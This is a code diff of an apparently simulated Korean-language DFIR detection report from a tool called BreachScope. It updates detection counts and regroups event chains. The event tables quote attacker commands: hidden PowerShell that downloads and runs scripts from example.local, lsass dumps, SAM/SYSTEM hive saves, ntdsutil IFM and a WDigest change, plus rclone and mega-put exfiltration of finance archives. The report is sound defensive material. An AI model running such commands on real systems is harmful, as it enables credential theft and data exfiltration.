@@ -51,7 +51,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <meta name="generator" content="BreachScope MVP" />
   <meta name="description" content="자동화된 DFIR 분석 보고서" />
-  <meta name="created" content="2026-06-11T16:24:55.577837+00:00" />
+  <meta name="created" content="2026-09-15T16:03:05.445686+00:00" />
 </head>
 <body>
   <h1>BreachScope 자동화 보고서</h1>
@@ -65,8 +65,8 @@
       영향 호스트 12개 · ATT&CK 기법 35개
     </div>
     <ul class="summary-list">
-      <li>총 53건의 의심 이벤트가 탐지되었고, 주요 영향 호스트는 WS-301입니다.</li>
-      <li>가장 많이 관측된 ATT&CK 기법은 T1490(Inhibit System Recovery)입니다.</li>
+      <li>총 54건의 의심 이벤트가 탐지되었고, 주요 영향 호스트는 WS-301입니다.</li>
+      <li>가장 많이 관측된 ATT&CK 기법은 T1059.001(Command and Scripting Interpreter: PowerShell)입니다.</li>
       <li>high/critical 등급 탐지가 22건 있어 우선 확인이 필요합니다.</li>
     </ul>
   </div>
@@ -146,7 +146,7 @@
         <td class="mono">powershell_downloader</td>
         <td>PowerShell downloader and encoded execution</td>
         <td>4</td>
-        <td><b>6</b></td>
+        <td><b>7</b></td>
         <td class="mono">WS-101</td>
         <td class="mono">T1059.001, T1105</td>
         <td class="mono">T1059.001, T1105</td>
@@ -220,7 +220,7 @@
       </tr>
       <tr>
         <td>Execution</td>
-        <td>6</td>
+        <td>7</td>
         <td class="sev-high">high</td>
         <td class="mono">T1047, T1059.001, T1569.002</td>
         <td class="mono">WS-101, WS-202, WS-203</td>
@@ -273,7 +273,7 @@
 
   <h2>룰팩 커버리지</h2>
   <div class="summary">
-    <p>적용 룰 <b>50</b>개 · 고유 ATT&CK 기법 <b>40</b>개 · Windows 핵심 기법 커버리지 <b>96.9%</b></p>
+    <p>적용 룰 <b>66</b>개 · 고유 ATT&CK 기법 <b>44</b>개 · Windows 핵심 기법 커버리지 <b>96.9%</b></p>
     <p style="color:#666">룰 전체 목록은 ZIP 패키지의 <span class="mono">report.rules.csv</span>에 포함됩니다.</p>
   </div>
   <table>
@@ -281,37 +281,37 @@
     <tbody>
       <tr>
         <td>Execution</td>
-        <td>7</td>
+        <td>11</td>
         <td class="sev-high">high</td>
         <td class="mono">T1047, T1059.001, T1569.002</td>
       </tr>
       <tr>
         <td>Persistence</td>
-        <td>4</td>
+        <td>6</td>
         <td class="sev-medium">medium</td>
         <td class="mono">T1053.005, T1543.003, T1547.001</td>
       </tr>
       <tr>
         <td>Defense Evasion</td>
-        <td>15</td>
+        <td>17</td>
         <td class="sev-high">high</td>
         <td class="mono">T1070.001, T1127.001, T1140, T1197, T1202, T1218.002, T1218.003, T1218.004, T1218.005, T1218.010, T1218.011, T1562.001, T1562.002, T1562.004</td>
       </tr>
       <tr>
         <td>Credential Access</td>
-        <td>6</td>
+        <td>8</td>
         <td class="sev-critical">critical</td>
-        <td class="mono">T1003.001, T1003.002, T1003.003, T1555, T1555.003</td>
+        <td class="mono">T1003, T1003.001, T1003.002, T1003.003, T1555, T1555.003</td>
       </tr>
       <tr>
         <td>Discovery</td>
-        <td>7</td>
+        <td>8</td>
         <td class="sev-medium">medium</td>
         <td class="mono">T1018, T1057, T1087.001, T1087.002, T1135, T1482, T1518.001</td>
       </tr>
       <tr>
         <td>Lateral Movement</td>
-        <td>2</td>
+        <td>3</td>
         <td class="sev-medium">medium</td>
         <td class="mono">T1021.001, T1021.006</td>
       </tr>
@@ -338,6 +338,12 @@
         <td>2</td>
         <td class="sev-critical">critical</td>
         <td class="mono">T1490</td>
+      </tr>
+      <tr>
+        <td>Unmapped</td>
+        <td>4</td>
+        <td class="sev-medium">medium</td>
+        <td class="mono">T1006, T1007, T1136.001</td>
       </tr>
     </tbody>
   </table>
@@ -498,6 +504,16 @@
         <td class="sev-medium">medium</td>
         <td>Execution</td>
         <td>Encoded PowerShell Command</td>
+        <td class="mono">powershell.exe -encodedcommand AAAABBBBCCCCDDDDEEEEFFFF</td>
+      </tr>
+      <tr>
+        <td class="mono">2026-01-15T09:02:00+00:00</td>
+        <td>0</td>
+        <td class="mono">WS-101</td>
+        <td class="mono">CORP\alice</td>
+        <td class="sev-medium">medium</td>
+        <td>Execution</td>
+        <td>EncodedCommand Generic (Safe)</td>
         <td class="mono">powershell.exe -encodedcommand AAAABBBBCCCCDDDDEEEEFFFF</td>
       </tr>
       <tr>
@@ -770,16 +786,6 @@
         <td>Process Discovery</td>
         <td class="mono">tasklist /svc</td>
       </tr>
-      <tr>
-        <td class="mono">2026-01-15T09:51:00+00:00</td>
-        <td>60</td>
-        <td class="mono">WS-301</td>
-        <td class="mono">CORP\analyst</td>
-        <td class="sev-medium">medium</td>
-        <td>Discovery</td>
-        <td>Security Software Discovery</td>
-        <td class="mono">mespace root/SecurityCenter2 -ClassName AntivirusProduct</td>
-      </tr>
     </tbody>
   </table>
 
@@ -830,6 +836,15 @@
         <td>MSHTA Remote Load</td>
       </tr>
       <tr>
+        <td class="mono">WS-101</td>
+        <td><b>100</b>/100</td>
+        <td class="sev-critical">critical</td>
+        <td>7</td>
+        <td class="sev-high">high</td>
+        <td class="mono">T1059.001, T1105</td>
+        <td>Suspicious Web Download</td>
+      </tr>
+      <tr>
         <td class="mono">FS-01</td>
         <td><b>100</b>/100</td>
         <td class="sev-critical">critical</td>
@@ -837,15 +852,6 @@
         <td class="sev-critical">critical</td>
         <td class="mono">T1070.001, T1490, T1562.001</td>
         <td>Recovery Inhibition</td>
-      </tr>
-      <tr>
-        <td class="mono">WS-101</td>
-        <td><b>100</b>/100</td>
-        <td class="sev-critical">critical</td>
-        <td>6</td>
-        <td class="sev-high">high</td>
-        <td class="mono">T1059.001, T1105</td>
-        <td>Suspicious Web Download</td>
       </tr>
       <tr>
         <td class="mono">SRV-DC01</td>
@@ -972,8 +978,8 @@
   </table>
 
   <div class="summary">
-    <p>총 탐지 건수: <b>53</b></p>
-    <p>적용 규칙 수: <b>50</b></p>
+    <p>총 탐지 건수: <b>54</b></p>
+    <p>적용 규칙 수: <b>66</b></p>
     <table style="width:auto; margin-top:8px">
       <thead>
         <tr><th>Severity</th><th>Count</th><th>MITRE</th><th>Count</th></tr>
@@ -982,7 +988,7 @@
         <tr>
           <td>
               <span class="sev-low">low</span>: 13&nbsp;&nbsp;
-              <span class="sev-medium">medium</span>: 18&nbsp;&nbsp;
+              <span class="sev-medium">medium</span>: 19&nbsp;&nbsp;
               <span class="sev-high">high</span>: 19&nbsp;&nbsp;
               <span class="sev-critical">critical</span>: 3&nbsp;&nbsp;
           </td>
@@ -1017,7 +1023,7 @@
               <span class="mono">T1202</span>: 1&nbsp;&nbsp;
               <span class="mono">T1547.001</span>: 1&nbsp;&nbsp;
               <span class="mono">T1053.005</span>: 1&nbsp;&nbsp;
-              <span class="mono">T1059.001</span>: 4&nbsp;&nbsp;
+              <span class="mono">T1059.001</span>: 5&nbsp;&nbsp;
               <span class="mono">T1490</span>: 5&nbsp;&nbsp;
               <span class="mono">T1070.001</span>: 1&nbsp;&nbsp;
               <span class="mono">T1555.003</span>: 1&nbsp;&nbsp;
@@ -1046,8 +1052,8 @@
     </div>
     <div class="bar-row">
       <span class="sev-medium" style="width:80px;">medium</span>
-      <div class="bar-wrap"><div class="bar" style="width: 95%"></div></div>
-      <span>18</span>
+      <div class="bar-wrap"><div class="bar" style="width: 100%"></div></div>
+      <span>19</span>
     </div>
     <div class="bar-row">
       <span class="sev-high" style="width:80px;">high</span>
@@ -1108,8 +1114,8 @@
     </div>
     <div class="bar-row">
       <span class="mono" style="width:120px;">WS-101</span>
-      <div class="bar-wrap"><div class="bar" style="width: 75%"></div></div>
-      <span>6</span>
+      <div class="bar-wrap"><div class="bar" style="width: 88%"></div></div>
+      <span>7</span>
     </div>
     <div class="bar-row">
       <span class="mono" style="width:120px;">FS-01</span>
@@ -1975,6 +1981,28 @@
       </tr>
       <tr>
         <td class="sev-medium">medium</td>
+        <td>EncodedCommand Generic (Safe)</td>
+        <td>T1059.001</td>
+        <td class="mono">2026-01-15T09:02:00+00:00</td>
+        <td class="mono">WS-101</td>
+        <td class="mono">powershell.exe [REDACTED] [BASE64...REDACTED]</td>
+        <td class="mono">powershell.exe [REDACTED] [BASE64...REDACTED]</td>
+      </tr>
+      <tr>
+        <td colspan="7">
+          <details>
+            <summary>세부 보기</summary>
+            <div style="margin:8px 0">
+              <div><b>룰 설명:</b> EncodedCommand Generic (Safe)</div>
+              <div><b>ATT&CK:</b> T1059.001</div>
+              <div><b>매치 값:</b> <span class="mono">[REDACTED]</span></div>
+              <div><b>원본 커맨드:</b> <span class="mono">powershell.exe [REDACTED] [BASE64...REDACTED]</span></div>
+            </div>
+          </details>
+        </td>
+      </tr>
+      <tr>
+        <td class="sev-medium">medium</td>
         <td>Suspicious Web Download</td>
         <td>T1105</td>
         <td class="mono">2026-01-15T09:04:00+00:00</td>
@@ -2353,7 +2381,7 @@
       </tr>
       <tr>
         <td class="mono">WS-101</td>
-        <td>6</td>
+        <td>7</td>
       </tr>
       <tr>
         <td class="mono">FS-01</td>
@@ -2417,7 +2445,7 @@
     <tbody>
       <tr>
         <td class="mono">2026-01-15 09:00</td>
-        <td>33</td>
+        <td>34</td>
       </tr>
       <tr>
         <td class="mono">2026-01-15 10:00</td>
@@ -2584,7 +2612,7 @@
       <tr>
         <td class="mono">T1059.001</td>
         <td>Command and Scripting Interpreter: PowerShell</td>
-        <td>4</td>
+        <td>5</td>
       </tr>
       <tr>
         <td class="mono">T1490</td>
@@ -2617,7 +2645,7 @@
   <h2>이벤트 체인 분석</h2>
   <div class="summary">
     <p>총 체인 수: <b>12</b></p>
-    <p>평균 신뢰도: <b>0.72</b></p>
+    <p>평균 신뢰도: <b>0.92</b></p>
     <p>체인 내 총 이벤트 수: <b>48</b></p>
     <table style="width:auto; margin-top:8px">
       <thead>
@@ -2629,7 +2657,7 @@
           <td>1</td>
         </tr>
         <tr>
-          <td>session</td>
+          <td>activity</td>
           <td>11</td>
         </tr>
       </tbody>
@@ -2638,7 +2666,7 @@
 
   <h3>상세 체인 목록</h3>
   <div style="border: 1px solid #ddd; margin: 12px 0; padding: 12px; border-radius: 4px;">
-    <h4>chain_1_download_exec - download_exec (신뢰도: 0.93)</h4>
+    <h4>chain_1_download_exec - download_exec (신뢰도: 0.98)</h4>
     <p><b>설명:</b> 웹 다운로드 후 실행 파일 실행</p>
     <p><b>시작:</b> 2026-01-15T09:04:00+00:00 | <b>종료:</b> 2026-01-15T09:06:00+00:00</p>
     <p><b>이벤트 수:</b> 2 | <b>탐지 수:</b> 4</p>
@@ -2666,110 +2694,8 @@
     </details>
   </div>
   <div style="border: 1px solid #ddd; margin: 12px 0; padding: 12px; border-radius: 4px;">
-    <h4>session_WS-101_CORP\alice - session (신뢰도: 0.70)</h4>
-    <p><b>설명:</b> 세션 WS-101_CORP\alice의 활동</p>
-    <p><b>시작:</b> 2026-01-15T09:00:00+00:00 | <b>종료:</b> 2026-01-15T09:06:00+00:00</p>
-    <p><b>이벤트 수:</b> 4 | <b>탐지 수:</b> 6</p>
-    <details>
-      <summary>이벤트 상세 (4개)</summary>
-      <table style="margin-top:8px; font-size:0.9em;">
-        <thead>
-          <tr><th>시간</th><th>호스트</th><th>소스</th><th>명령</th></tr>
-        </thead>
-        <tbody>
-          <tr>
-            <td class="mono">2026-01-15T09:00:00+00:00</td>
-            <td class="mono">WS-101</td>
-            <td>ProcessCreate</td>
-            <td class="mono">powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command Write-Output SIMULATE</td>
-          </tr>
-          <tr>
-            <td class="mono">2026-01-15T09:02:00+00:00</td>
-            <td class="mono">WS-101</td>
-            <td>ProcessCreate</td>
-            <td class="mono">powershell.exe [REDACTED] [BASE64...REDACTED]</td>
-          </tr>
-          <tr>
-            <td class="mono">2026-01-15T09:04:00+00:00</td>
-            <td class="mono">WS-101</td>
-            <td>ProcessCreate</td>
-            <td class="mono">powershell.exe [REDACTED] https://example.local/stage1.ps1 -OutFile C:\ProgramData\stage1.ps1</td>
-          </tr>
-          <tr>
-            <td class="mono">2026-01-15T09:06:00+00:00</td>
-            <td class="mono">WS-101</td>
-            <td>ProcessCreate</td>
-            <td class="mono">powershell.exe IEX ([REDACTED]).DownloadString('https://example.local/bootstrap.txt')</td>
-          </tr>
-        </tbody>
-      </table>
-    </details>
-  </div>
-  <div style="border: 1px solid #ddd; margin: 12px 0; padding: 12px; border-radius: 4px;">
-    <h4>session_SRV-DC01_CORP\svc-backup - session (신뢰도: 0.70)</h4>
-    <p><b>설명:</b> 세션 SRV-DC01_CORP\svc-backup의 활동</p>
-    <p><b>시작:</b> 2026-01-15T09:10:00+00:00 | <b>종료:</b> 2026-01-15T09:13:00+00:00</p>
-    <p><b>이벤트 수:</b> 3 | <b>탐지 수:</b> 3</p>
-    <details>
-      <summary>이벤트 상세 (3개)</summary>
-      <table style="margin-top:8px; font-size:0.9em;">
-        <thead>
-          <tr><th>시간</th><th>호스트</th><th>소스</th><th>명령</th></tr>
-        </thead>
-        <tbody>
-          <tr>
-            <td class="mono">2026-01-15T09:10:00+00:00</td>
-            <td class="mono">SRV-DC01</td>
-            <td>ProcessCreate</td>
-            <td class="mono">procdump -ma lsass.exe C:\Temp\lsass_simulated.dmp</td>
-          </tr>
-          <tr>
-            <td class="mono">2026-01-15T09:12:00+00:00</td>
-            <td class="mono">SRV-DC01</td>
-            <td>ProcessCreate</td>
-            <td class="mono">reg save HKLM\SAM C:\Temp\sam.save</td>
-          </tr>
-          <tr>
-            <td class="mono">2026-01-15T09:13:00+00:00</td>
-            <td class="mono">SRV-DC01</td>
-            <td>ProcessCreate</td>
-            <td class="mono">reg save HKLM\SYSTEM C:\Temp\system.save</td>
-          </tr>
-        </tbody>
-      </table>
-    </details>
-  </div>
-  <div style="border: 1px solid #ddd; margin: 12px 0; padding: 12px; border-radius: 4px;">
-    <h4>session_SRV-DC01_CORP\admin - session (신뢰도: 0.70)</h4>
-    <p><b>설명:</b> 세션 SRV-DC01_CORP\admin의 활동</p>
-    <p><b>시작:</b> 2026-01-15T09:16:00+00:00 | <b>종료:</b> 2026-01-15T09:18:00+00:00</p>
-    <p><b>이벤트 수:</b> 2 | <b>탐지 수:</b> 2</p>
-    <details>
-      <summary>이벤트 상세 (2개)</summary>
-      <table style="margin-top:8px; font-size:0.9em;">
-        <thead>
-          <tr><th>시간</th><th>호스트</th><th>소스</th><th>명령</th></tr>
-        </thead>
-        <tbody>
-          <tr>
-            <td class="mono">2026-01-15T09:16:00+00:00</td>
-            <td class="mono">SRV-DC01</td>
-            <td>ProcessCreate</td>
-            <td class="mono">ntdsutil ifm create full C:\Temp\ifm-simulated</td>
-          </tr>
-          <tr>
-            <td class="mono">2026-01-15T09:18:00+00:00</td>
-            <td class="mono">SRV-DC01</td>
-            <td>ProcessCreate</td>
-            <td class="mono">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /d 1</td>
-          </tr>
-        </tbody>
-      </table>
-    </details>
-  </div>
-  <div style="border: 1px solid #ddd; margin: 12px 0; padding: 12px; border-radius: 4px;">
-    <h4>session_FS-01_CORP\ops - session (신뢰도: 0.70)</h4>
-    <p><b>설명:</b> 세션 FS-01_CORP\ops의 활동</p>
+    <h4>activity_1 - activity (신뢰도: 1.00)</h4>
+    <p><b>설명:</b> 동일 호스트/사용자의 30분 이내 활동 묶음</p>
     <p><b>시작:</b> 2026-01-15T09:20:00+00:00 | <b>종료:</b> 2026-01-15T09:30:00+00:00</p>
     <p><b>이벤트 수:</b> 5 | <b>탐지 수:</b> 7</p>
     <details>
@@ -2814,8 +2740,150 @@
     </details>
   </div>
   <div style="border: 1px solid #ddd; margin: 12px 0; padding: 12px; border-radius: 4px;">
-    <h4>session_WS-203_CORP\helpdesk - session (신뢰도: 0.70)</h4>
-    <p><b>설명:</b> 세션 WS-203_CORP\helpdesk의 활동</p>
+    <h4>activity_2 - activity (신뢰도: 1.00)</h4>
+    <p><b>설명:</b> 동일 호스트/사용자의 30분 이내 활동 묶음</p>
+    <p><b>시작:</b> 2026-01-15T10:10:00+00:00 | <b>종료:</b> 2026-01-15T10:16:00+00:00</p>
+    <p><b>이벤트 수:</b> 4 | <b>탐지 수:</b> 4</p>
+    <details>
+      <summary>이벤트 상세 (4개)</summary>
+      <table style="margin-top:8px; font-size:0.9em;">
+        <thead>
+          <tr><th>시간</th><th>호스트</th><th>소스</th><th>명령</th></tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td class="mono">2026-01-15T10:10:00+00:00</td>
+            <td class="mono">FS-02</td>
+            <td>ProcessCreate</td>
+            <td class="mono">7z a C:\Temp\finance_archive.7z C:\Shares\Finance\*.xlsx</td>
+          </tr>
+          <tr>
+            <td class="mono">2026-01-15T10:12:00+00:00</td>
+            <td class="mono">FS-02</td>
+            <td>ProcessCreate</td>
+            <td class="mono">rclone copy C:\Temp\finance_archive.7z remote:incident-demo --log-file C:\Temp\rclone.log</td>
+          </tr>
+          <tr>
+            <td class="mono">2026-01-15T10:14:00+00:00</td>
+            <td class="mono">FS-02</td>
+            <td>ProcessCreate</td>
+            <td class="mono">mega-put C:\Temp\finance_archive.7z /Root/demo</td>
+          </tr>
+          <tr>
+            <td class="mono">2026-01-15T10:16:00+00:00</td>
+            <td class="mono">FS-02</td>
+            <td>ProcessCreate</td>
+            <td class="mono">[REDACTED] https://example.local/checkin?id=192.168.10.55&[BASE64...REDACTED]</td>
+          </tr>
+        </tbody>
+      </table>
+    </details>
+  </div>
+  <div style="border: 1px solid #ddd; margin: 12px 0; padding: 12px; border-radius: 4px;">
+    <h4>activity_3 - activity (신뢰도: 0.84)</h4>
+    <p><b>설명:</b> 동일 호스트/사용자의 30분 이내 활동 묶음</p>
+    <p><b>시작:</b> 2026-01-15T09:16:00+00:00 | <b>종료:</b> 2026-01-15T09:18:00+00:00</p>
+    <p><b>이벤트 수:</b> 2 | <b>탐지 수:</b> 2</p>
+    <details>
+      <summary>이벤트 상세 (2개)</summary>
+      <table style="margin-top:8px; font-size:0.9em;">
+        <thead>
+          <tr><th>시간</th><th>호스트</th><th>소스</th><th>명령</th></tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td class="mono">2026-01-15T09:16:00+00:00</td>
+            <td class="mono">SRV-DC01</td>
+            <td>ProcessCreate</td>
+            <td class="mono">ntdsutil ifm create full C:\Temp\ifm-simulated</td>
+          </tr>
+          <tr>
+            <td class="mono">2026-01-15T09:18:00+00:00</td>
+            <td class="mono">SRV-DC01</td>
+            <td>ProcessCreate</td>
+            <td class="mono">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /d 1</td>
+          </tr>
+        </tbody>
+      </table>
+    </details>
+  </div>
+  <div style="border: 1px solid #ddd; margin: 12px 0; padding: 12px; border-radius: 4px;">
+    <h4>activity_4 - activity (신뢰도: 1.00)</h4>
+    <p><b>설명:</b> 동일 호스트/사용자의 30분 이내 활동 묶음</p>
+    <p><b>시작:</b> 2026-01-15T09:10:00+00:00 | <b>종료:</b> 2026-01-15T09:13:00+00:00</p>
+    <p><b>이벤트 수:</b> 3 | <b>탐지 수:</b> 3</p>
+    <details>
+      <summary>이벤트 상세 (3개)</summary>
+      <table style="margin-top:8px; font-size:0.9em;">
+        <thead>
+          <tr><th>시간</th><th>호스트</th><th>소스</th><th>명령</th></tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td class="mono">2026-01-15T09:10:00+00:00</td>
+            <td class="mono">SRV-DC01</td>
+            <td>ProcessCreate</td>
+            <td class="mono">procdump -ma lsass.exe C:\Temp\lsass_simulated.dmp</td>
+          </tr>
+          <tr>
+            <td class="mono">2026-01-15T09:12:00+00:00</td>
+            <td class="mono">SRV-DC01</td>
+            <td>ProcessCreate</td>
+            <td class="mono">reg save HKLM\SAM C:\Temp\sam.save</td>
+          </tr>
+          <tr>
+            <td class="mono">2026-01-15T09:13:00+00:00</td>
+            <td class="mono">SRV-DC01</td>
+            <td>ProcessCreate</td>
+            <td class="mono">reg save HKLM\SYSTEM C:\Temp\system.save</td>
+          </tr>
+        </tbody>
+      </table>
+    </details>
+  </div>
+  <div style="border: 1px solid #ddd; margin: 12px 0; padding: 12px; border-radius: 4px;">
+    <h4>activity_5 - activity (신뢰도: 1.00)</h4>
+    <p><b>설명:</b> 동일 호스트/사용자의 30분 이내 활동 묶음</p>
+    <p><b>시작:</b> 2026-01-15T09:00:00+00:00 | <b>종료:</b> 2026-01-15T09:06:00+00:00</p>
+    <p><b>이벤트 수:</b> 4 | <b>탐지 수:</b> 7</p>
+    <details>
+      <summary>이벤트 상세 (4개)</summary>
+      <table style="margin-top:8px; font-size:0.9em;">
+        <thead>
+          <tr><th>시간</th><th>호스트</th><th>소스</th><th>명령</th></tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td class="mono">2026-01-15T09:00:00+00:00</td>
+            <td class="mono">WS-101</td>
+            <td>ProcessCreate</td>
+            <td class="mono">powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command Write-Output SIMULATE</td>
+          </tr>
+          <tr>
+            <td class="mono">2026-01-15T09:02:00+00:00</td>
+            <td class="mono">WS-101</td>
+            <td>ProcessCreate</td>
+            <td class="mono">powershell.exe [REDACTED] [BASE64...REDACTED]</td>
+          </tr>
+          <tr>
+            <td class="mono">2026-01-15T09:04:00+00:00</td>
+            <td class="mono">WS-101</td>
+            <td>ProcessCreate</td>
+            <td class="mono">powershell.exe [REDACTED] https://example.local/stage1.ps1 -OutFile C:\ProgramData\stage1.ps1</td>
+          </tr>
+          <tr>
+            <td class="mono">2026-01-15T09:06:00+00:00</td>
+            <td class="mono">WS-101</td>
+            <td>ProcessCreate</td>
+            <td class="mono">powershell.exe IEX ([REDACTED]).DownloadString('https://example.local/bootstrap.txt')</td>
+          </tr>
+        </tbody>
+      </table>
+    </details>
+  </div>
+  <div style="border: 1px solid #ddd; margin: 12px 0; padding: 12px; border-radius: 4px;">
+    <h4>activity_6 - activity (신뢰도: 0.59)</h4>
+    <p><b>설명:</b> 동일 호스트/사용자의 30분 이내 활동 묶음</p>
     <p><b>시작:</b> 2026-01-15T09:39:00+00:00 | <b>종료:</b> 2026-01-15T09:41:00+00:00</p>
     <p><b>이벤트 수:</b> 2 | <b>탐지 수:</b> 2</p>
     <details>
@@ -2842,8 +2910,8 @@
     </details>
   </div>
   <div style="border: 1px solid #ddd; margin: 12px 0; padding: 12px; border-radius: 4px;">
-    <h4>session_WS-301_CORP\analyst - session (신뢰도: 0.70)</h4>
-    <p><b>설명:</b> 세션 WS-301_CORP\analyst의 활동</p>
+    <h4>activity_7 - activity (신뢰도: 1.00)</h4>
+    <p><b>설명:</b> 동일 호스트/사용자의 30분 이내 활동 묶음</p>
     <p><b>시작:</b> 2026-01-15T09:45:00+00:00 | <b>종료:</b> 2026-01-15T09:51:00+00:00</p>
     <p><b>이벤트 수:</b> 7 | <b>탐지 수:</b> 8</p>
     <details>
@@ -2900,8 +2968,8 @@
     </details>
   </div>
   <div style="border: 1px solid #ddd; margin: 12px 0; padding: 12px; border-radius: 4px;">
-    <h4>session_WS-401_CORP\dev - session (신뢰도: 0.70)</h4>
-    <p><b>설명:</b> 세션 WS-401_CORP\dev의 활동</p>
+    <h4>activity_8 - activity (신뢰도: 1.00)</h4>
+    <p><b>설명:</b> 동일 호스트/사용자의 30분 이내 활동 묶음</p>
     <p><b>시작:</b> 2026-01-15T09:55:00+00:00 | <b>종료:</b> 2026-01-15T10:07:00+00:00</p>
     <p><b>이벤트 수:</b> 7 | <b>탐지 수:</b> 7</p>
     <details>
@@ -2958,48 +3026,8 @@
     </details>
   </div>
   <div style="border: 1px solid #ddd; margin: 12px 0; padding: 12px; border-radius: 4px;">
-    <h4>session_FS-02_CORP\data - session (신뢰도: 0.70)</h4>
-    <p><b>설명:</b> 세션 FS-02_CORP\data의 활동</p>
-    <p><b>시작:</b> 2026-01-15T10:10:00+00:00 | <b>종료:</b> 2026-01-15T10:16:00+00:00</p>
-    <p><b>이벤트 수:</b> 4 | <b>탐지 수:</b> 4</p>
-    <details>
-      <summary>이벤트 상세 (4개)</summary>
-      <table style="margin-top:8px; font-size:0.9em;">
-        <thead>
-          <tr><th>시간</th><th>호스트</th><th>소스</th><th>명령</th></tr>
-        </thead>
-        <tbody>
-          <tr>
-            <td class="mono">2026-01-15T10:10:00+00:00</td>
-            <td class="mono">FS-02</td>
-            <td>ProcessCreate</td>
-            <td class="mono">7z a C:\Temp\finance_archive.7z C:\Shares\Finance\*.xlsx</td>
-          </tr>
-          <tr>
-            <td class="mono">2026-01-15T10:12:00+00:00</td>
-            <td class="mono">FS-02</td>
-            <td>ProcessCreate</td>
-            <td class="mono">rclone copy C:\Temp\finance_archive.7z remote:incident-demo --log-file C:\Temp\rclone.log</td>
-          </tr>
-          <tr>
-            <td class="mono">2026-01-15T10:14:00+00:00</td>
-            <td class="mono">FS-02</td>
-            <td>ProcessCreate</td>
-            <td class="mono">mega-put C:\Temp\finance_archive.7z /Root/demo</td>
-          </tr>
-          <tr>
-            <td class="mono">2026-01-15T10:16:00+00:00</td>
-            <td class="mono">FS-02</td>
-            <td>ProcessCreate</td>
-            <td class="mono">[REDACTED] https://example.local/checkin?id=192.168.10.55&[BASE64...REDACTED]</td>
-          </tr>
-        </tbody>
-      </table>
-    </details>
-  </div>
-  <div style="border: 1px solid #ddd; margin: 12px 0; padding: 12px; border-radius: 4px;">
-    <h4>session_WS-501_CORP\user1 - session (신뢰도: 0.70)</h4>
-    <p><b>설명:</b> 세션 WS-501_CORP\user1의 활동</p>
+    <h4>activity_9 - activity (신뢰도: 0.81)</h4>
+    <p><b>설명:</b> 동일 호스트/사용자의 30분 이내 활동 묶음</p>
     <p><b>시작:</b> 2026-01-15T10:20:00+00:00 | <b>종료:</b> 2026-01-15T10:26:00+00:00</p>
     <p><b>이벤트 수:</b> 4 | <b>탐지 수:</b> 4</p>
     <details>
@@ -3038,8 +3066,8 @@
     </details>
   </div>
   <div style="border: 1px solid #ddd; margin: 12px 0; padding: 12px; border-radius: 4px;">
-    <h4>session_WS-601_CORP\operator - session (신뢰도: 0.70)</h4>
-    <p><b>설명:</b> 세션 WS-601_CORP\operator의 활동</p>
+    <h4>activity_10 - activity (신뢰도: 1.00)</h4>
+    <p><b>설명:</b> 동일 호스트/사용자의 30분 이내 활동 묶음</p>
     <p><b>시작:</b> 2026-01-15T10:30:00+00:00 | <b>종료:</b> 2026-01-15T10:36:00+00:00</p>
     <p><b>이벤트 수:</b> 4 | <b>탐지 수:</b> 4</p>
     <details>
@@ -3078,8 +3106,8 @@
     </details>
   </div>
   <div style="border: 1px solid #ddd; margin: 12px 0; padding: 12px; border-radius: 4px;">
-    <h4>session_WS-701_CORP\designer - session (신뢰도: 0.70)</h4>
-    <p><b>설명:</b> 세션 WS-701_CORP\designer의 활동</p>
+    <h4>activity_11 - activity (신뢰도: 0.81)</h4>
+    <p><b>설명:</b> 동일 호스트/사용자의 30분 이내 활동 묶음</p>
     <p><b>시작:</b> 2026-01-15T10:40:00+00:00 | <b>종료:</b> 2026-01-15T10:46:00+00:00</p>
     <p><b>이벤트 수:</b> 4 | <b>탐지 수:</b> 4</p>
     <details>
@@ -3120,9 +3148,9 @@
 
   <h2>공격 시나리오 추론</h2>
   <div class="summary">
-    <p>총 시나리오 수: <b>1</b></p>
-    <p>평균 신뢰도: <b>0.60</b></p>
-    <p>고유 MITRE 기법 수: <b>35</b></p>
+    <p>총 시나리오 수: <b>6</b></p>
+    <p>평균 신뢰도: <b>0.79</b></p>
+    <p>고유 MITRE 기법 수: <b>6</b></p>
     <table style="width:auto; margin-top:8px">
       <thead>
         <tr><th>공격 단계</th><th>개수</th></tr>
@@ -3130,7 +3158,15 @@
       <tbody>
         <tr>
           <td>execution</td>
+          <td>2</td>
+        </tr>
+        <tr>
+          <td>lateral_movement</td>
           <td>1</td>
+        </tr>
+        <tr>
+          <td>persistence</td>
+          <td>3</td>
         </tr>
       </tbody>
     </table>
@@ -3139,45 +3175,12 @@
   <h3>상세 시나리오 목록</h3>
   <div style="border: 2px solid #4a90e2; margin: 16px 0; padding: 16px; border-radius: 4px; background: #f8f9fa;">
     <h4>웹 다운로드 및 실행 (신뢰도: 0.60)</h4>
-    <p><b>시나리오 ID:</b> scenario_chain_download_0</p>
+    <p><b>시나리오 ID:</b> scope_5bf306f7b6c2bbd0_scenario_chain_download_0</p>
     <p><b>공격 단계:</b> execution</p>
     <p><b>설명:</b> 웹에서 파일을 다운로드한 후 실행한 활동</p>
     <p><b>관련 MITRE 기법:</b>
-      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1218.011</span>
-      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1003.003</span>
-      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1490</span>
-      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1518.001</span>
-      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1127.001</span>
-      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1562.002</span>
-      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1087.001</span>
-      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1218.005</span>
-      <span class="mono" style="background: #e3f2fd; padding: 2px 6px; border-radius: 3px; margin-right: 4px;">T1560.001</span>
